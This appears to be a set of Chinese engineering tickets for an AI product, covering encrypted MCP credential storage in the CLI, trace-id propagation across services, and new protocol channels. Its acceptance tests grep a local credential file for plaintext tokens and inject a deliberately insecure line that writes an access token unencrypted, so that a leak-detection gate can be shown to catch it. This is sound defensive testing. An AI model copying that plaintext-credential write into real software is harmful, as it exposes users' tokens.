5. 跨端与 i18n：CLI 是唯一写入端（**平台独占**：`~/.ihui` 本机状态目录，web/miniapp/RN 不经手 MCP OAuth；桌面端另有 `local-vault.ts` 通道不在本票射程，只作格式对齐参照）。新增文案 3 条（zh 原文照此，五语言同批）：`cli.mcpCredentials.storePlaintext`=「MCP 凭据当前以明文存于 {path}（本机降级）」；`cli.mcpCredentials.storeEncrypted`=「MCP 凭据已加密存储（后端：{backend}）」；`cli.mcpCredentials.migrationFailed`=「凭据迁移未完成，已保留原文件且未覆盖（{reason}）」。
6. 验收判据：票面①实测 —— 手工新建一条 MCP 授权后跑 `node apps/cli/dist/index.js capabilities --json | grep -o '"credentialStore":{[^}]*}'`，档位必须是 `keychain`/`encrypted-file`，若为 `plaintext-file` 则同命令必须同时给出 reason（**不接受"没打印"**）；明文不存在阳性对照 —— `grep -c '"accessToken"' ~/.ihui/mcp-credentials.json` 在非降级档上必须为 0 或文件不存在；凭据内容不进 stdout —— `AT` 维自检 + `node scripts/check-credential-leak-in-message.mjs --self-test` 末行现读；**反向对照（证明 ④ 有牙）**：往临时索引注入一处 `writeFileSync(p, JSON.stringify({accessToken: tok}))`（无信封出口）⇒ 门 67 `--staged` 必红并点名该文件；把同一段只写进注释 ⇒ 必绿（注释不计）。
7. 依赖与顺序：OS 钥匙串探针先行（第 2 栏的 `未取证`），探针失败即停在 ①+② 的第二/第三档，**不得**为通过验收去伪造"已加密"；`local-vault.ts` 的信封格式若与本票 CLI 侧共用，须同笔确认 `scripts/check-desktop-cache-plaintext.mjs` 的结构级判据不被绕过（它按 `{ihuiVaultV1}` 恰一层判，跨包同族约束 §3）。
8. 风险与回退：**最高风险是"迁移把可用凭据变孤儿"** —— 三道防护照抄 `local-vault.ts` 硬约束：回读比对一致才认、读通道失败时绝不生成/覆盖密钥、迁移失败保留原文件并大声报；回退 = 保留明文文件原样 + 把档位打回 `plaintext-file`（① 的出口是纯读，不锁死）。爆炸半径 = 单用户的 CLI MCP 授权，不影响 web/服务端（服务端凭据走 §5d 与 `credentials_crypto.py`）。**需 §24 拍板：是**（新增"加密/降级"这一用户可见行为 + 可能新增 OS 依赖）。预填方案：**不引入任何新 npm 依赖**（`keytar` 一类需原生编译，与 §12e 的依赖树教训冲突），走"系统自带能力探针 + 机器绑定口令文件 + 明文显式降级"三档；默认**新写入即走第二档（加密）**，存量首次读时迁移；`IHUI_MCP_CRED_PLAINTEXT=1` 保留一条明确的降级逃生口（只允许关"要不要加密"，不允许关"要不要喊"，对齐 §5e 对显式开关的口径）。

### D147 可观测:无分布式追踪,跨四执行体拼不出一条链(承 V4 #104;取证 2026-09-28)

1. 目标行为：某一轮对话出问题时（很慢 / 审批没弹 / 工具没结果），我能拿一个 id 从浏览器一路查到 provider 调用记录，而不是在四台机器上逐端翻日志对时间戳。
2. 现状锚点 + **推翻票面**：票面"仓内未命中 OTel/LangFuse/Jaeger/Sentry 依赖"现读为**假**：`apps/api/package.json:47-52` 有 `@opentelemetry/{api,auto-instrumentations-node,exporter-trace-otlp-http,resources,sdk-node,semantic-conventions}`；`apps/ai-service/pyproject.toml:37-39` 有 `opentelemetry-sdk` / `exporter-otlp` / `instrumentation-fastapi`；`deploy/observability/docker-compose.observability.yml:18,35,49,65` 现读已备好 **otel-collector + jaeger + prometheus + grafana**（另有 `.github/workflows/observability-drills.yml`）。W3C 链路也**不是从零**：`apps/api/src/utils/trace-context.ts:32,44` 生成/解析、`apps/api/src/plugins/otel.ts:99` **仅在客户端未带时才造 root**（不吞上游 trace）、`apps/api/src/utils/ai-service-fetch.ts:44` 派 child 给出站请求、`apps/ai-service/app/telemetry.py:92` 把 traceparent 挂进 span 父子链。**票面引的文件路径有一处写错**：是 `apps/ai-service/app/middleware/trace_context.py`，不是 `core/trace_context.py`（命令：`git ls-tree -r --name-only HEAD | grep trace_context`）。真正缺的四段（逐条现读）：**(i) 客户端不发** —— `git grep -rn 'traceparent' HEAD -- apps/web packages apps/cli apps/miniapp-taro apps/mobile-rn apps/desktop` = **0 命中**，链从 api 起步；且 `apps/ai-service/app/main.py:719` CORS `allow_headers=["Authorization","Content-Type","X-Internal-Secret"]` **不含 traceparent**，浏览器一旦开始发会被预检拒。**(ii) trace 进了 ai-service 就断在中间件** —— `request.state.trace_id` 由 `app/middleware/trace_context.py` 写入（`app/main.py:727` 注册），但 `git grep -n 'trace_id' HEAD -- apps/ai-service/app/routers` 只命中 computer_use 的浏览器录制（另一族），即没有任何路由把它喂给 `AgentLoopV2.bind_trace()`（`app/services/agent_loop_v2.py:942`，现读调用点只有 `:1895/:1937` 两处 self-绑定）⇒ 票面那句"全自研、拼不出链"实际是**"地基在、最后两跳没接"**。**(iii) SSE 帧不回带** —— `apps/ai-service/app/core/sse_contract.py` 的 `tool-approval` 帧载荷现读为 `{type, approval_id, tool_name, tool_call_id, args_preview, danger_level, session_id}`，**无 trace 字段**，前端与用户机器无从知道这一轮属于哪条链。**(iv) 工具级 trace 事件不带 trace id** —— `apps/ai-service/app/core/tool_call_trace.py:33 CallTraceEvent` 字段只有 `thread_id/tool_*/call_id/turn_id/cell_id/runtime_tool_call_id`（`as_dict()` 键为 `conversation.id`、`call_id`…），与 OTel 的 `trace_id` 不同轴。关联字段现读结论（供"复用哪一个"拍板）：**复用 OTel/W3C 的 `trace_id`(32 hex) 作链主键**；`apps/api/src/plugins/api-logger-extended.ts:37 request.requestId`（经 ALS 注入，被 `plugins/n1-detector.mjs` 用于按请求计 SQL）与 `plugins/trace.ts:23 request.trace.traceId` 是 api 进程内**已有的两条并行 id**——本票不改它们的键名，只把它们在日志行上与 `traceparent` 的 trace_id 并列打印（三 id 并存属既存事实，收敛属另一票，须先量谁在消费 requestId）。**(v) 执行体接合点**：api(`plugins/otel.ts`)、ai-service(`app/telemetry.py`)、CLI(`apps/cli/src/telemetry/index.ts:308 startTrace()`，自述"极简 fetch 批量上报，不引 OTel SDK"，键取 `packages/types/src/agent-runtime.ts:680 TraceContext`)、desktop/网页(经 `packages/api-client`，该包现读零 traceparent) ⇒ CLI 与桌面**不引入 SDK**，只做"生成 + 透传 + 打本地日志"。
3. 改动分解：① **止血（两跳接线，零新栈）** 客户端生成：`packages/api-client/src` 单点为所有请求加 `traceparent` 头（沿用 W3C 格式，客户端 role 位留空即合法 root），并把 ai-service CORS `allow_headers` 加 `"traceparent"`（`apps/ai-service/app/main.py:719`）与 api 侧同源一处；ai-service 接线：`routers/llm.py`/`routers/engine.py` 在建 loop 前 `loop.bind_trace(request.state.trace_id)`，让 `emit()` 的自动注入（`agent_loop_v2.py:952`）真正生效。② **回带** `sse_contract.py` + `packages/shared/src/sse/contract.ts` 的帧载荷统一加可选 `traceId`，先只给三类帧加（`start`、`tool-approval`、`tool-result`）；前端 `apps/web` 与 extension 出错提示里可复制该 id（不加则本轮不碰 UI）。③ **工具级关联** `CallTraceEvent.as_dict()` 增 `"trace_id"`（值取当前 OTel span 的 trace id），使"这轮慢/这次审批没弹"能按 id 串起 `tool_call_trace` 面。④ **provider 段** litellm 调用记录/日志行加同一 trace_id（现读 `apps/ai-service/app/services/telemetry_service.py` 是同类落点，扩展它而不是新建模块）。⑤ **尺子（挂现有门）** 不新建 APM 门：把"traceparent 必须成链"两判并进 `scripts/check-agent-event-parity.mjs`（SSE 契约双端）与门 67 的既有取材层 —— 判 (a) api-client 出口必发 `traceparent`、(b) `sse_contract.py` 的 `tool-approval` 段必须登记 `traceId` 而 TS 侧同名，取不到 ⇒ 未判定不记绿。
4. 受影响文件：`packages/api-client/src/*`（单一 transport 出口文件，具体文件名待开工首步 `git grep -ln 'fetchApi' HEAD -- packages/api-client` 现读）、`apps/ai-service/app/main.py`(CORS)、`apps/ai-service/app/routers/llm.py`、`apps/ai-service/app/routers/engine.py`、`apps/ai-service/app/core/tool_call_trace.py`、`apps/ai-service/app/core/sse_contract.py`、`apps/ai-service/app/services/telemetry_service.py`、`packages/shared/src/sse/contract.ts`、`apps/api/src/plugins/api-logger-extended.ts`(日志行并 id)、`apps/cli/src/telemetry/index.ts`(复用其 `startTrace`)、`scripts/check-agent-event-parity.mjs`+测试、`apps/ai-service/tests/test_trace_span_link.py`[新]。
5. 跨端与 i18n：§9 —— api-client 一处出口 ⇒ web / desktop / extension / miniapp-taro / mobile-rn / cli 六端共享（`git grep -ln 'Taro.request\|axios' HEAD -- packages/api-client` 现读确认无旁路，若有则同批改）；无新对外能力，仅错误提示可复制 id：`common.errorTraceId`=「排查编号：{traceId}」（五语言同批；若本轮不改 UI 则不登记该键，避免"有键无消费者"）。
6. 验收判据：任一轮串起四段 —— `python -m pytest apps/ai-service/tests/test_trace_span_link.py -k one_round`：以 in-process ASGI 跑一轮带工具调用的对话，从 `traceparent` 请求头出发，断言 (a) `request.state.trace_id` == 头里的 trace_id、(b) `bind_trace` 后 `emit()` 出的事件 payload 含同值 `trace_id`、(c) `tool_call_trace` 事件 `as_dict()["trace_id"]` 同值、(d) `tool-approval` 帧含 `traceId`；**脱敏阳性对照**：同一用例喂一条含 `sk-` 与中文 prompt 的输入，断言 span/trace 属性集合里**无** `prompt` 原文与 `sk-` 子串（票面验收②）；反向对照（改坏就红）：把 `bind_trace` 调用删掉 ⇒ (b)(c) 必红；把 CORS 那行撤回 ⇒ api-client 发头的例必红（`未取证：浏览器预检这一维只能靠 CI/真机复验，in-process 测不到`）。
7. 依赖与顺序：独立可派，且顺序敏感：**先 ①（接线）再 ②③④**，否则回带字段与工具级字段没有可信的 trace 值可填；D142 与本票无耦合，但 D142 头注"追踪语义本轮不装字段位"这句要保持成立 —— 本票**不往 `ToolContract` 加 trace 字段**，trace id 走 HTTP/事件载荷，不进工具契约（避免造出第二个关联主键）。
8. 风险与回退：① 客户端发头会让 trace 起点从 api 变成用户设备，**采样率**需复核 —— `app/telemetry.py:55` 现读 `OTEL_TRACES_SAMPLER_ARG` 默认 `0.1`，端上链路一旦贯通，10% 采样意味着"用户报的那一轮常常没被采到"，故本票要求对话主链路（`/llm/complete/stream`）走 `parentbased_traceidratio` 且 root=1.0 或按显式头 `x-ihui-debug: 1` 全采（预填方案，避免"平台齐了但查不到"）；②③ 只增字段、向后兼容，回退 = 停发头 + 撤 `traceId` 键（两侧同笔撤，否则 parity 门红）。爆炸半径：日志与遥测面，不改鉴权、不改响应体既有键。**需 §24 拍板：不改变用户可见行为的范围不需要**；仅"是否给用户看排查编号"(`common.errorTraceId`) 与"主链路采样率抬到 100%"两项属可见/成本变更，预填：先只在后端日志与 `--capabilities` 输出编号、UI 不显示；采样率仅对带 debug 标的会话全采，其余维持 0.1。

## 族 E · 协议通道（D151 D152 D153 D154 D155）

> 取证基线（全部现读 HEAD，勿照抄本节数字派单）：
> - TS 契约 `packages/shared/src/sse/contract.ts` 的 `SSE_EVENTS` 共 **30** 名（chunk/reasoning/tool-call-start/tool-result/tool-delegate/tool-summary/citations/question/subagent_spawn/subagent_progress/subagent_end/plan-step/thinking/plan_updated/terminal_start/terminal_end/terminal_delta/done/error/fallback/usage/compaction/steer/budget/injection_applied/retry_scheduled/start/tool-approval/tool-delta/form_request）；Python `apps/ai-service/app/core/sse_contract.py` 的 `SSE_EVENTS` frozenset 同 30 名逐字等值。复验：`git show HEAD:packages/shared/src/sse/contract.ts` / `git show HEAD:apps/ai-service/app/core/sse_contract.py`。
> - `packages/api-client/src/client.ts` 的 `on*` 回调声明数 = **30**。复验：`git show HEAD:packages/api-client/src/client.ts | grep -cE '  on[A-Z][A-Za-z]*\??:'`。
> - **parity 门的真实判序**（`git show HEAD:scripts/check-agent-event-parity.mjs` 对账 0 @:658 / 对账 0b @:679 + 规则 3）：① 对账 0 = TS↔PY 两份 SSE_EVENTS 双向集合等值，缺一侧即红；② 对账 0b 方向是 **生产 ⊆ 契约**（llm.py 发了没登记的才红）；③ **前端监听而后端零生产 = 阻断**，后端有生产而前端无人消费 = 警告。**订正一处文档引用**：contract.ts 的 FORM_FRAME_EVENTS 注释称「契约 ⊆ 生产由对账 0b 与对账 0 双向看护」——按门代码，「登记进契约但无人生产也无人监听」的名字**不会**被机器判红；真正把它逼到同批落地的是规则 3（一旦你接了 on* 回调与前端监听）。⇒ 本族每一票的硬顺序都是：**生产点、双端契约登记、api-client 回调、web 监听，四者同枚提交**（或生产先行）。
> - 上行回传帧的既有模板：`POST /llm/complete/stream/{session_id}/approval-response`（V3 #58）与 `.../form-response`（V3 #63，llm.py:249 注释区），共用上行出口在 `packages/api-client/src/client.ts:3552` 附近（「tool-result / form-response 共用这一处，不得各抄一份」）。form_request 的**线格式 camelCase 陷阱**（写成 snake 整帧静默丢弃，contract.ts:64 区注释）对本族全部新帧适用：新 payload 的键名风格必须与 api-client 解析层逐字同形并在判别联合里注明。
> - 鉴权铁律（AGENTS §5「认证不等于授权」）：本族所有新上行端点，principal 一律取令牌主体经路由依赖注入，**不得**读 body/Query 自报 userId；越权用例断言「未发出查询/未写入进程 stdin/待决表未动」，不只断言 403。

### D151 协议通道①:交互式命令没有「等待用户输入」态,也没有把键入送回去的通道(取证 2026-09-28,一手)。

1. **目标行为**：agent 在对话里跑需要 tty 输入的命今（y/n、密码提示、REPL）时，用户在消息流的终端卡上看到「它在等什么」，能直接键入并让进程收到；不能介入时也有一句明说的降级文案，而不是流无限空转。
2. **现状锚点 + 否证**：
   - 对话流终端面只有 `terminal_start/terminal_delta/terminal_end`（上面 30 名清单现读）；票面否证命令复核成立。
   - **否证①（推翻票面一半措辞）**：「把键入送回去的通道」**在产品里已经存在** —— `apps/api/src/plugins/terminal-ws.ts` 的 `/ws/terminal/:sessionId` 接受 `{type:'input'}→writeInput`、`{type:'resize'}`、`{type:'close'}`（HEAD :112-122），web 端 `apps/web/src/hooks/use-terminal-session.ts:346/383` 真发这些帧。缺的不是通道，是它住在 **IDE 终端面板的 PTY 会话**，与 agent 对话流的两套执行器互不相通。⇒ **本票范围要缩**为「桥接 + 一个下行帧」，不是新建上行协议。
   - **否证②**：`question` 事件（llm.py:2884 等 8 处生产；`packages/api-client/src/endpoints/chat.ts:384 POST /api/ai/chat/questions` 落库应答）是 AI 澄清选择问答，语义最近但不是原始 stdin，不能顶账。
   - **否证③**：`apps/ai-service/app/services/agent_engine.py:6272-6423` 有常驻 shell 会话工具（sessionId 续写 stdin，注释自述「对标 Codex unified_exec」）——但触发者是**模型**不是用户；对话流主链 `_TERMINAL_TOOL_NAMES`（llm.py:370）走的 `mcp_server.py` run_command 是 `create_subprocess_exec` + 一次性 drain（:2391/:2421），stdin 无回写口。
   - 为什么仍算缺：用户在对话流里确实拿不到「等待输入」态与键入口，故障形态（terminal_delta 空转到硬超时）不变。
3. **改动分解**：
   - 步骤1（止血·ai-service）：run_command 类执行循环新增「stdin 等待探测」（进程存活 + stdout 尾窗命中提示模式 + 静默 N 秒）→ 发下行帧 `terminal_interaction`（payload `{terminalId, promptTail, waitingSinceMs, inputMode:'line'}`），并把该进程登记进**带主记录的待决表**（future + terminalId + user_id，照 batch-59/60 的「存带主记录」规矩）。
   - 步骤2（根治·ai-service）：上行端点 `POST /llm/complete/stream/{session_id}/terminal-input`（照 form-response 模板：principal 走令牌依赖，不读 body.userId；按 terminalId+属主双条件命中待决表才 `proc.stdin.write`）；`terminate` 复用既有 stop 通道不新建。
   - 步骤3（契约三处同批）：`contract.ts` SSE_EVENTS + 判别成员、`sse_contract.py` frozenset + `SSE_EVENT_CONTRACTS` 条目（该清单与集合有严格双射测试 `tests/test_sse_contract.py`）、api-client `onTerminalInteraction?` 回调 + `postTerminalInput()` 走 client.ts:3552 那**同一处**上行共用段。
   - 步骤4（消费）：web 终端卡（terminal 帧渲染处）加输入行 + 「命令超时未被输入」的超时降级；**RN/小程序降级文案**：「此命令需要键盘输入，手机端暂不能代答，请在桌面端处理或停止本次执行」（两端只渲染 `terminal_interaction.waiting` 态，不接输入口）。
4. **受影响文件**：`apps/ai-service/app/services/mcp_server.py`、`apps/ai-service/app/routers/llm.py`、`apps/ai-service/app/core/sse_contract.py`、`packages/shared/src/sse/contract.ts`、`packages/api-client/src/client.ts`、`apps/web/src/hooks/use-chat/send-message.ts`、`apps/web/src/components/chat/**`（终端卡所在件，开工前 `git grep -n terminal_start HEAD -- apps/web/src` 定位渲染落点）、`packages/app/src/**` 与 `apps/miniapp-taro/src/**`（仅降级文案渲染）、`packages/i18n/messages/shared/{zh-CN,zh-TW,en,ja,ko}.json`、`apps/ai-service/tests/`（新用例文件 [新]）。
5. **跨端与 i18n**：§9 默认全端。新增键（zh 原文）：`chat.terminal.waitingInput`「等待你的输入」、`chat.terminal.promptLabel`「命令提示：{{prompt}}」、`chat.terminal.submit`「发送」、`chat.terminal.timeoutNoInput`「{{seconds}} 秒内未收到输入」、`chat.terminal.mobileUnsupported`「此命令需要键盘输入，手机端暂不能代答」。五语言同批走 §19 流水线（i18n-diff → 翻译 → i18n-apply → parity 校验）。
6. **验收判据**：① 跑 `read -p "x: "` 类命令，断言下行帧到达且 POST terminal-input 后进程真收到（`python -m pytest apps/ai-service/tests/<新用例>` 断言 stdin mock 收到的字节 = 提交值）；② 越权用例：B 用户带 A 的 terminalId POST ⇒ 断言 **write 从未发生**（`proc.stdin.write` spy 为空）而非只看 403；③ `node scripts/check-agent-event-parity.mjs` exit 0；**反向对照**：删掉生产点只留 web 监听，该门必须红（「前端监听而后端无生产」）——证明帧真被接线而不是靠白名单放过。
7. **依赖与顺序**：可独立派；「尺子①扩端消费面」未完成前，web 先行、两端仅降级文案（票面归属声明复核成立）。生产点先于 api-client 回调入库（顺序错了就是给自己造恒红）。
8. **风险与回退**：stdin 直通进程=新攻击面——输入长度封顶、不落日志、命令结束后待决条目必删；回退 = 去掉探测与端点（两端降级文案可留）。**需 §24 拍板**（agent 执行进入「可被人代答」是新的对外行为），预填方案：默认开启、单次等待上限 300s、超时按「模型可自行决策的失败」回灌 tool-result 而非挂流；bypassPermissions 档不弹输入。

### D152 协议通道②:会话内「目标(goal)」状态没有下行事件,对话流看不到目标(取证 2026-09-28,一手)。

1. **目标行为**：目标（/goal）的设立/暂停/受阻/完成不再只活在当前这台浏览器里——同一会话的其他端与引擎循环都看得到当前目标与状态。
2. **现状锚点 + 否证（本票被否证改动最大）**：
   - 通道面缺失复核成立：30 事件里无 goal 族（现读清单）；`git grep -niE goal HEAD -- packages/shared/src/sse packages/types/src/agent-runtime.ts apps/api/src/routes/chat*` 无协议命中。
   - **但「对话流看不到目标」不成立**：web 已有完整本地实现 —— `apps/web/src/components/ai/goal-card.tsx`（STATUS_BADGE、D89 耗时条）**已挂载**（`apps/web/src/components/ai/ai-side-panel-tools.tsx:525 return <GoalCard />`），`/goal` 由 `apps/web/src/hooks/use-chat/slash-commands.ts:321` 拦截（不发给 LLM），状态在 `apps/web/src/stores/goal.ts`（zustand persist + `createGoalPersistStorage` 加密持久化），**四态** `'active'|'paused'|'blocked'|'done'`，且 D64⑥ 已补编辑通道（renameGoal）。
   - 为什么仍算缺（且不是等价物）：这份状态**没有服务侧主人**——引擎/ai-service 对它零感知（`goal` 在 apps/api 的命中全是别的域：AgentExecuteRequest.goal 等，现读），换浏览器/换端即丢，多端必然分叉。下行事件连「生产点」都没有：给一个纯客户端态登记 SSE 帧，接上监听即触发 parity 规则 3 的「监听而无生产」阻断。
   - ⇒ **范围必须重述**：本票实质是三件事——(a) goal 状态服务化（存储 + 上行 set/pause/resume/clear），(b) 下行同步帧，(c) 六态还是四态定档。(a) 不在票面原文里，但没有它 (b) 是空帧。
3. **改动分解**：步骤1（前置·止血）ai-service 侧 `thread/goal` 等价存储：会话表扩展或新表 [新] + `POST /llm/sessions/{session_id}/goal`（set/pause/resume/clear 一个端点带 action，principal 走令牌主体）；web slash-commands 改为本地乐观更新 + 调该端点（stores/goal.ts 从「唯一真相」降为「缓存」）。步骤2（根治）下行帧 `goal_updated`（payload `{status, objective?, elapsedMs?, tokenUsage?}`，与 `goal_cleared`，两帧还是「status:'cleared' 一帧」见第 8 栏预填）+ 契约三处同批 + api-client `onGoalUpdate`。步骤3 web/RN/miniapp 渲染（两端有卡片位则复用 GoalCard 形态，无则一行胶囊）。
4. **受影响文件**：`apps/ai-service/app/routers/llm.py`、`apps/ai-service/app/services/session_store.py`（或 [新] `goal_store.py`）、`packages/database/src/schema/`（[新] 列/表 + 迁移，动 schema 走守门 49 离线判据）、`packages/shared/src/sse/contract.ts`、`apps/ai-service/app/core/sse_contract.py`、`packages/api-client/src/client.ts`、`apps/web/src/hooks/use-chat/slash-commands.ts`、`apps/web/src/stores/goal.ts`、`apps/web/src/components/ai/goal-card.tsx`、`packages/app/src/features/**`、`apps/miniapp-taro/src/**`、五语言 shared 语言包。
5. **跨端与 i18n**：新增键：`chat.goal.status.active`「进行中」、`.paused`「已暂停」、`.blocked`「已受阻」、`.done`「已完成」（现存 goalCard 命名空间按现读沿用，新增端只补少的档）；若定六态再补 `.usageLimited`「额度受限」、`.budgetLimited`「预算受限」。**状态词汇是一等契约**（AGENTS §30 + 守门 151 教训）：goal 态与 AGENT_TASK_STATUSES 六态是两个域，**不得并集**，登记时必须证明两域交集为空。
6. **验收判据**：① A 端 `/goal x` 后 B 端同会话不刷新即见目标（断言收到下行帧）；② 越权：B 对 A 的 session 调 goal 端点 ⇒ 断言库无写入（select 验证行不存在）；③ `node scripts/check-agent-event-parity.mjs` exit 0；反向对照：只登记契约不写生产 ⇒ 该门「llm.py 事件提取」不红但**接了 onGoalUpdate 后**必红（规则 3），以此证明票面「通道先于卡片」的顺序判据存在。
7. **依赖与顺序**：(a)→(b) 严格串行；与 D153 的载体决策无冲突（本票走 SSE 流内帧 + 会话 REST，不走 WS）；承 D64⑥ 对照表（其「budgetLimited/usageLimited 待取证」标签仍然有效——那是**竞品侧**未取证，不影响我方定档自决）。
8. **风险与回退**：goal 服务化动了 `/goal` 语义（现在它连 LLM 都不经过），回退=端点保留但前端不接（降级回纯本地）。**需 §24 拍板两处**，预填：① 档位取 **六态**（在现存四态上并入 `usageLimited`/`budgetLimited`，与 budget 帧的 critical 档和 CLI 的 budget_limited 语义对齐——CLI 已在用这个词，AGENTS §8）；② 事件形态取 **单帧 `goal_updated` 带 `status:'cleared'`**（不建 `goal_cleared` 第二帧，减少 30→31 只进一名，且 cleared 幂等语义由 status 承载）。

### D153 协议通道③:会话设置与元数据变更没有下行,多端同一会话会分叉(取证 2026-09-28,一手)。

1. **目标行为**：在手机上给会话改名/归档、在电脑上换该会话绑定的模型，另一台设备**不刷新**就能看到；看不到时也有「这台设备看不到别人的改动」的明示，而不是沉默分叉。
2. **现状锚点 + 否证（范围要缩，且载体判断被推翻一半）**：
   - 票面否证复核成立：`git grep -niE "settings_updated|session_updated|title_updated" HEAD -- packages apps/ai-service/app apps/api/src` 只命中 `v1-realtime.ts:140 SessionUpdatedEvent`（那是 **V1 对外开发者 API** 的事件接口，不是产品对话流——相邻但不等价，不得顶账）与数据库迁移里的无关外键名。
   - **服务器确有 per-conversation 可变元数据**：`packages/database/src/schema/chat.ts:30/31/38` `title` / `model` / `archivedAt` 三列在库 ⇒ 「改名/归档不推给另一端」这一半票面为真。
   - **但「模型/权限档按旧档走」不成立**：`permissionMode` 不在对话流也不在会话表（D111 对账实证：它是 workspace 级 REST `getWorkspacePermission/setWorkspacePermission`）；采样参数 `sampling-params.ts` 是发送时刻从**本机** localStorage 取的会话级客户端态。⇒ B 端「按旧档」实际是「按它自己那份本地档」，服务端根本没有可同步的档位主人——这是**档位主副本归属**问题，不是加一条下行事件能修的。
   - **载体已有现成候选**：`apps/api/src/plugins/ws-broadcast.ts` 提供 `broadcastToUser(userId, event, data)`（per-user 常连 WS，:29/:71）——但 HEAD 面**全仓零生产者**（`git grep "broadcastToUser(" HEAD -- apps/api/src` 除插件自身零命中），web 侧亦无消费该事件的接线：又一格「造好没装车」。本票应复用它而不是给 SSE 加帧——SSE 流按请求存在，「两次流之间的变更」结构上发不出去。
   - ⇒ **本票范围缩为**：(a) `title/model/archivedAt` 变更时经 ws-broadcast 推 `{event:'conversation:updated', data:{conversationId, fields, changedBy, at}}`；(b) 采样/权限档的「服务端主副本化」是前置缺失，**另计一票**（登记进票面，不在本票顺手做）；「谁改的」字段票面验收②直接落在 payload 里。
3. **改动分解**：步骤1（止血）apps/api 各变更路由（rename/archive/PATCH model 的落点，开工前 `git grep -n "archivedAt" HEAD -- apps/api/src/routes` 定位）统一在写库成功后调 `server.broadcastToUser`；步骤2 web/两端接 `/ws/broadcast` 订阅（web 已有 `createNotificationClient` 的 WS 底座，先查它连的是哪个端点再接线，**禁止**开第二条 per-user 常连）并 invalidate 对应 store 切片；步骤3 冲突语义：同字段两连击以库为准，收到 `fields` 含自己刚改的字段且 `changedBy≠本人` 时给一次性提示条。全程**不新增 SSE_EVENTS 成员**（不动对账 0）。
4. **受影响文件**：`apps/api/src/plugins/ws-broadcast.ts`、`apps/api/src/routes/chat.ts` 及 archive/rename 所在路由（以步骤1 grep 结果为准）、`packages/api-client/src/`（[新] per-user 广播订阅端，或并入现有 notification client）、`apps/web/src/stores/chat.ts`、`apps/web/src/hooks/`（侧栏/头部取数处）、`packages/app/src/**`、`apps/miniapp-taro/src/**`、`packages/types/src/`（广播事件类型，封闭判别）。
5. **跨端与 i18n**：三端都要（这是同步层）；新增键：`chat.meta.changedElsewhere`「此会话的{{field}}已在其他设备更新为「{{value}}」」、`chat.meta.field.title`「标题」、`chat.meta.field.archive`「归档状态」、`chat.meta.field.model`「模型」；降级形态（小程序 WS 生命周期受限）：`chat.meta.pullOnly`「小程序端将在下次打开时同步该改动」。五语言同批。
6. **验收判据**：① 双端同开一个会话，A 端改名，B 端断言**不发 HTTP 请求**即更新（网络面板计数=0、UI 值变）；② 反向对照：注释掉写库后的 broadcastToUser 调用 ⇒ 用例①必红（证明测的是推送而不是轮询副作用）；③ payload 缺 `changedBy` 时单测必红（票面验收②钉进断言）。
7. **依赖与顺序**：可独立派；但「尺子①」对两端消费面的要求在本票同样成立（RN/小程序至少接 pullOnly）；与 D152 无冲突（那票走 SSE 流内，本票走 WS 常连，两条通道的判据互不解释）。
8. **风险与回退**：常连 WS 的在线会话数放大（ws-broadcast 已有单用户连接数超限拒绝 :121，沿用）；回退 = 调用点摘除，前端收到不到广播自然退回现有拉取制。§24 拍板一处，预填：**默认全端常开** per-user 广播订阅（notification 已在用同底座，不新增用户可关项），「档位同步」明确**不做**进本票（主副本归属未定，先造推送=推一个不存在的主人）。

### D154 协议通道④:MCP 启动状态与 OAuth 完成没有下行,连不上时对话里看不出来(取证 2026-09-28,一手)。

1. **目标行为**：MCP 服务器连不上/正在重连时，对话里出现一句「某某 MCP 未连接，工具不可用」并可一键去设置或重试，而不只是「某个工具调用失败了」。
2. **现状锚点 + 否证（票面两处按现读修正）**：
   - 通道面零命中复核成立：30 事件无 MCP 状态族；`ConnectorAuthCard` 五态件（`apps/web/src/components/ai/connector-auth-card.tsx`，`CONNECTOR_AUTH_STATES`）**唯一引用面是它自己的测试**（`git grep -n "connector-auth-card" HEAD -- apps/web/src` 生产面零命中，与 D149 登记一致）。
   - **否证①（比票面强的部分，如实登记）**：机制面比票面写的更全——`mcp_oauth.py` 的 `MCPOAuthClient` 存在且被 `mcp_client.py:41` 接线；`mcp.py:426 POST /mcp/external/servers/{name}/connect` 手动连接端点已入库；`mcp_server.py:118-125` 有 elicitation 计数暂停服务（env 默认 off）。
   - **但由此第 2 半被削**：`McpServer/oauthLogin/completed` 的对应物要能响，前提是有**用户在流程中发起的 OAuth 授权**；现读 MCPOAuthClient 是客户端自动取 token（streamable-http 配置内），产品面无「去浏览器授权」的交互流——**OAuth 下行半票前提不足**：未取证 `mcp_oauth.py` 是否含 auth-code/interactive 分支（文件未逐行读）。登记为 `未取证:mcp_oauth.py 交互式授权流未读面`，本票只建 **startup/连接状态** 下行，oauth_completed 挂到「交互式 MCP 授权入口」票后再做。
   - 时序结构问题：MCP server 启动在 **ai-service 会话初始化**，早于任何 SSE 流 ⇒ 下行帧只能搭载在「该会话后续流首」或由 D153 的 WS 常承载。**两载体二选一拍板见第 8 栏**，不得同批各建一条（第二真相）。
3. **改动分解**：步骤1（生产点先行）ai-service mcp 连接生命周期（mcp_client/mcp_server 的 connect/reconnect/失败退出位）把状态写进 per-user 运行态表；步骤2 下行：首选搭载 WS（复用 D153 的 conversation/mcp 同级 `event:'mcp:status'`，payload `{server, state:'connecting'|'connected'|'failed'|'reconnecting', reason?, attempt?, maxAttempts?}`——attempt/max 形状与 retry_scheduled 帧同族，不另发明）；若拍板走 SSE 则**同批**登记契约两侧 + 生产点 + 回调 + 监听四件套，否则对账 0 红；步骤3（最后，顺序票面已明：先通道再组件）把 ConnectorAuthCard 从孤儿接进对话流（D149 同批或紧随），给「去 MCP 设置 / 重连」两个动作（重连即 POST connect 端点，principal 走令牌主体）；两端降级：`chat.mcp.mobileSettingsHint`「请在桌面端或网页端管理 MCP 连接」。
4. **受影响文件**：`apps/ai-service/app/services/mcp_client.py`、`apps/ai-service/app/services/mcp_server.py`、`apps/ai-service/app/routers/mcp.py`、（若走 SSE）`packages/shared/src/sse/contract.ts` + `apps/ai-service/app/core/sse_contract.py` + `packages/api-client/src/client.ts`、`apps/api/src/plugins/ws-broadcast.ts`（若走 WS）、`apps/web/src/components/ai/connector-auth-card.tsx`、`apps/web/src/components/chat/**`（挂载位）、`packages/i18n/messages/shared/*`。
5. **跨端与 i18n**：web 全量；RN/小程序至少显示状态行 + 降级提示。新增键：`chat.mcp.state.connecting`「正在连接 {{server}}…」、`.failed`「{{server}} 连接失败」、`.reconnecting`「第 {{attempt}}/{{maxAttempts}} 次重连 {{server}}」、`.action.retry`「立即重连」、`.action.openSettings`「打开 MCP 设置」、`.mobileSettingsHint`（同上）。
